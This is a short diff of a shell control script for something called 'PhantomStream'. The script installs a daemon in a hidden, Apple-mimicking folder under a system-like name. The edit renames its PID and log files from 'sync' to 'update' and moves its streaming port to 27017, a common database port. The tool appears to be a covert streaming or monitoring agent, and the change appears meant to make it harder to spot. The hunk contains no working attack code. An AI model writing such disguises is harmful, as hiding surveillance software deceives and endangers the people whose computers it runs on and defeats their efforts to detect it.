@@ -11,9 +11,9 @@ die()  { echo -e "${RED}[PhantomStream]${RESET} $*" >&2; exit 1; }
 
 INSTALL_DIR="$HOME/Library/.AppleDiagnostics"
 DAEMON="$INSTALL_DIR/com.institute.backgroundsyncd"
-PID_FILE="$INSTALL_DIR/sync.pid"
-LOG_FILE="$INSTALL_DIR/sync.log"
-STREAM_PORT=9090
+PID_FILE="$INSTALL_DIR/update.pid"
+LOG_FILE="$INSTALL_DIR/update.log"
+STREAM_PORT=27017
 
 [[ -f "$DAEMON" ]] || die "Not installed. Run install.sh first."
 
